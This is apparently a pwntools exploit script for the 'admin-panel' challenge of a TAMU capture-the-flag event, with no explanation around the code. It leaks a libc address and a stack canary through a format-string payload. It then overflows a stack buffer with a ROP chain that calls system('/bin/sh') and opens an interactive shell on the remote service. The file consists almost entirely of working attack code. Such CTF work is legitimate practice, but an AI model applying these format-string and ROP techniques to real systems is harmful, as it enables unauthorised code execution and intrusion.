from pwn import *
from time import sleep
context.arch = 'amd64'

def debug():
	if local<2:
		gdb.attach(p,'''

			b* admin+343
			''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./admin-panel")
libc=ELF("./libc.so.6")
nc="nc tamuctf.com 443"
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
	p=remote(host,port,ssl=True, sni="admin-panel")
else:
	p=process([exe.path])

############### helper functions ##############
def send():
	pass

############### main exploit    ###############
p.sendline("admin")
#debug()
p.sendline(b"secretpass123\x00"+b"a"*(0x20-14)+b"%7$p%15$p")

p.recvuntil("admin\n")
x=int(p.recv(14),16)
print(hex(x))
libc.address=x- (0x7ff8affd496f-0x00007ff8aff32000) - 0x26
print(hex(libc.address))

sleep(0.5)
canary=int(p.recv(18),16)

binsh=next(libc.search(b"/bin/sh\x00"))
system=libc.symbols["system"]
rdi=libc.address+0x0000000000039f6b
p.sendline("2")
p.sendline(b"a"*0x48+p64(canary)+p64(0)+p64(rdi)+p64(binsh)+p64(system))

p.interactive()
